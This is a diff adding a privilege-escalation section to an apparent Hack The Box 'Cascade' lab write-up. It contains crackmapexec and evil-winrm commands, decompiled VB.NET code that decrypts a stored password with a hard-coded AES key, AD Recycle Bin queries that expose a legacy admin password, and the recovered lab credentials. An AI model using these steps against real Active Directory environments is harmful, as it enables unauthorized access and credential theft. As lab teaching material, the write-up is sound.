@@ -175,6 +175,121 @@ And it worked: </br>
 I used evil-winrm and got a shell: ```evil-winrm -u s.smith -p sT333ve2 -i 10.10.10.182``` </br>
 cd ```C:\Users\s.smith\desktop``` -> type ```user.txt``` -> Got the user flag. </br>
 # Privilege Escalation
+Before getting into the winrm shell I just got, I also tried to see if there's anything interesting within the smb shares: </br>
+```crackmapexec smb -u s.smith-p sT333ve2 --shares 10.10.10.182``` </br>
+I found a share called Audit that contained some executable and database files, I searched for it in the shell I got, there was a ```c:\shares\``` directory,  but I didn't have permissions to access it , but I could just go into the Audit folder inside: </br>
+```cd C:\shares\audit``` </br>
+I copied all of the files to my Kali Linux: </br>
+```bash
+mask ""
+recurse ON 
+prompt OFF 
+mget *
+```
+
+I first checked the database file, and found out an encrypted password inside: </br>
+```1|ArkSvc|BQO5l5Kj9MdErXx6Q6AGOw==|cascade.local``` </br>
+Couldn't decode it with base64, thinking it was encrypted somehow. </br>
+I used DNSpy to investigate the ```CascAudit.exe``` file, and I found out exactly how it encrypts the password, I chose to modify the code and decrypt it: </br> </br>
+**Modified Code:** </br>
+```bash
+Imports System
+Imports System.IO
+Imports System.Security.Cryptography
+Imports System.Text
+	' Token: 0x02000007 RID: 7
+	Public Class Crypto
+		' Token: 0x06000012 RID: 18 RVA: 0x00002290 File Offset: 0x00000690
+		Public Shared Function EncryptString(Plaintext As String, Key As String) As String
+			Dim bytes As Byte() = Encoding.UTF8.GetBytes(Plaintext)
+			Dim aes As Aes = Aes.Create()
+			aes.BlockSize = 128
+			aes.KeySize = 128
+			aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842")
+			aes.Key = Encoding.UTF8.GetBytes(Key)
+			aes.Mode = CipherMode.CBC
+			Dim result As String
+			Using memoryStream As MemoryStream = New MemoryStream()
+				Using cryptoStream As CryptoStream = New CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write)
+					cryptoStream.Write(bytes, 0, bytes.Length)
+					cryptoStream.FlushFinalBlock()
+				End Using
+				result = Convert.ToBase64String(memoryStream.ToArray())
+			End Using
+			Return result
+		End Function
+
+		' Token: 0x06000013 RID: 19 RVA: 0x00002360 File Offset: 0x00000760
+		Public Shared Function DecryptString(EncryptedString As String, Key As String) As String
+			Dim array As Byte() = Convert.FromBase64String(EncryptedString)
+			Dim aes As Aes = Aes.Create()
+			aes.KeySize = 128
+			aes.BlockSize = 128
+			aes.IV = Encoding.UTF8.GetBytes("1tdyjCbY1Ix49842")
+			aes.Mode = CipherMode.CBC
+			aes.Key = Encoding.UTF8.GetBytes(Key)
+			Dim [string] As String
+			Using memoryStream As MemoryStream = New MemoryStream(array)
+				Using cryptoStream As CryptoStream = New CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Read)
+					' The following expression was wrapped in a checked-expression
+					Dim array2 As Byte() = New Byte(array.Length - 1 + 1 - 1) {}
+					cryptoStream.Read(array2, 0, array2.Length)
+					[string] = Encoding.UTF8.GetString(array2)
+				End Using
+			End Using
+			Return [string]
+		End Function
+
+		' Token: 0x04000006 RID: 6
+		Public Const DefaultIV As String = "1tdyjCbY1Ix49842"
+
+		' Token: 0x04000007 RID: 7
+		Public Const Keysize As Integer = 128
+	End Class
+
+Public Class test
+Public Sub Main()
+Dim password As String = String.Empty
+Console.WriteLine(Crypto.DecryptString("BQO5l5Kj9MdErXx6Q6AGOw==", "c4scadek3y654321"))
+End Sub
+End Class
+```
+
+It worked, the password is: ```w3lc0meFr31nd``` </br>
+I tried using crackmapexec again: </br>
+```crackmapexec smb 10.10.10.182 -u arksvc -p w3lc0meFr31nd``` </br>
+```crackmapexec winrm 10.10.10.182 -u arksvc -p w3lc0meFr31nd``` </br>
+Only winrm worked, so I got in and started to investigate ```arksvc``` user. </br> </br>
+**Enumeration:** </br>
+```net user arksvc``` </br>
+Arksvc is a a member of ```AD Recycle Bin``` group </br>
+**AD Recycle Bin:** </br>
+AD Recycle Bin is a well-know Windows group. Active Directory Object Recovery (or Recycle Bin) is a feature added in Server 2008 to allow administrators to recover deleted items just like the recycle bin does for files. </br>
+Examples of Querying Deleted Active Directory users source: </br>
+https://opentechtips.com/how-to-query-deleted-ad-users-with-powershell/ </br> </br>
+I first listed all of the deleted users: ```Get-ADObject -Filter {isDeleted -eq $true} -IncludeDeletedObjects -Properties *``` </br>
+I found TempAdmin user there, </br>
+I queried him: ```Get-ADObject -Filter {SamAccountName -eq "TempAdmin"} -IncludeDeletedObjects -Properties *``` </br>
+And found this: </br>
+**cascadeLegacyPwd:** YmFDVDNyMWFOMDBkbGVz </br>
+Decrypted it with: ```echo YmFDVDNyMWFOMDBkbGVz | base64 -d``` </br>
+The result: baCT3r1aN00dles </br> </br>
+This password worked for the main administrator account, as it was written in the 'Meeting_Notes_June_2018.html' file: </br>
+```Username is TempAdmin (password is the same as the normal admin account password).``` </br> </br>
+```bash
+evil-winrm -u administrator -p baCT3r1aN00dles -i 10.10.10.182
+cd :\Users\Administrator\desktop
+type root.txt
+```
+
+It worked. I got the root flag. </br>
+
+
+
+
+
+
+
 
 
 
